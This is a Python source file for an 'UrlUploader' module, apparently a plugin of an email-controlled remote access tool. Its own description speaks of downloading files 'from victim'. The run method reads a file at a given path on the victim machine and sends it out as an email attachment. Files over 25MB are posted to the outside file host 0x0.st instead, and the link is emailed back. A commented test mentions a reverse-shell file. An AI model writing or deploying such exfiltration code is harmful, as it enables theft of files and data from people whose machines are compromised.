import requests
import os.path
import os



class UrlUploader:
    def __init__(self):
        self.name = "UrlUploader"
        self.info = "Uploads a file from Given Path to Gmail or an Api (if file greater than 25MB)"
        self.args = ["Path: Path from victim to download file"]
        self.command = ":upload,[Path]"
    

    def isbinary(self,filepath):
        try:
            f = open(filepath,"r")
            print(f.read())
            f.close()
            return False
        except Exception as e:
            return True
    
    def moreThan25Mb(self,filepath):
        file_size = os.path.getsize(filepath)
        size = file_size / (1024 * 1024)
        if size >= 25:
            return True
        else:
            return False


    def upload_file_api(self,filepath):
        if self.isbinary(filepath):
            files = {
                'file': open(filepath, 'rb'),
                }
        else:
            files = {
                'file': open(filepath, 'rb'),
                }
        response = requests.post('https://0x0.st', files=files)
        if response.status_code == 200:
            url = response.text.split("\n")[0]
            return url
        else:
            return "Unable to upload file"
            

    def run(self,filepath,EmailHandler,msgId):
        filename = os.path.basename(filepath)
        if self.moreThan25Mb(filepath):

            url = self.upload_file_api(filepath)
            EmailHandler.send_email(
                message = f"File is more than 25Mb so using api instead of attachement\nUrl is: {url}",
                msgId=msgId,
                reply=True
            )
        f = open(filepath,"rb")
        data = f.read()
        EmailHandler.send_file(
            file = data,
            filename = filename,
            msgId=msgId,
            message="File is Given Below"
        )
       


# if __name__ == "__main__":
    # u = UrlUpload()
    # u.upload_file_api("/home/sid/Desktop/myProjects/pyhackthon/GIFS/REVERSESHELL.gif")
    # # /